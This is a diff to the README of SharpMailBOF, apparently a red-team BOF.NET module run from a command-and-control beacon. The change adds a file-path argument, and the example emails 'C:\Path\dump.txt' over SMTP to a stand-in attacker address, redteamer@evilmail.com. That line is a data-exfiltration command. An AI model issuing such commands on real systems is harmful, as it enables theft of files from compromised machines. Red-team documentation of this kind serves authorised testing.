@@ -6,11 +6,11 @@ SharpMailBOF is a quick and dirty [BOF.NET](https://github.com/CCob/BOF.NET) (Th
 ```
 bofnet_init
 bofnet_load [Path_to_DLL]
-bofnet_execute BOFNET.Bofs.SharMailBof [SMTP_SERVER] [PORT] [RECIPIENT] [SENDER] [SUBJECT] [BODY]
+bofnet_execute BOFNET.Bofs.SharMailBof [SMTP_SERVER] [PORT] [RECIPIENT] [SENDER] [SUBJECT] [BODY] [PATH]
 ```
 ## Example
 ```
-bofnet_execute BOFNET.Bofs.SHarpMailBof mail.example.com 25 redteamer@evilmail.com noreply@example.com "Test" "This is only a test."
+bofnet_execute BOFNET.Bofs.SHarpMailBof mail.example.com 25 redteamer@evilmail.com noreply@example.com "Test" "This is only a test." "C:\Path\dump.txt"
 ```
 
 ## Notes
